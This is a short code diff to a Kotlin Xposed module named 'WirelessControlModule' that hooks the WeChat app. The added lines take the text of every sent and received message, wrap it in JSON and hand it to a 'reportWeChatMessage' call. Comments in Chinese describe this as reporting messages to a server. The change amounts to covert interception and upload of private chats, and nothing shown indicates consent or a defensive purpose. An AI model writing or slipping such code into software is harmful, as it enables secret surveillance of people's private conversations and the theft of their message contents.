@@ -382,7 +382,17 @@ class WirelessControlModule : IXposedHookLoadPackage {
                                         try {
                                             if (param.args.isNotEmpty() && param.args[0] != null) {
                                                 val msg = param.args[0]
-                                                Log.i(TAG, "📤 Sending message: ${parseMessage(msg)}")
+                                                val messageText = parseMessage(msg)
+                                                Log.i(TAG, "📤 Sending message: $messageText")
+                                                
+                                                // 上报消息到服务器
+                                                MainActivity.getInstance()?.reportWeChatMessage(
+                                                    org.json.JSONObject().apply {
+                                                        put("type", "send")
+                                                        put("content", messageText)
+                                                        put("direction", "sent")
+                                                    }
+                                                )
                                             }
                                         } catch (e: Exception) {
                                             Log.e(TAG, "Failed to intercept send", e)
@@ -486,6 +496,14 @@ class WirelessControlModule : IXposedHookLoadPackage {
             when (direction) {
                 "received" -> {
                     Log.i(TAG, "📨 Received message: $content")
+                    // 上报接收到的消息
+                    MainActivity.getInstance()?.reportWeChatMessage(
+                        org.json.JSONObject().apply {
+                            put("type", "receive")
+                            put("content", content)
+                            put("direction", "received")
+                        }
+                    )
                 }
                 "sent" -> {
                     Log.i(TAG, "📤 Sent message: $content")
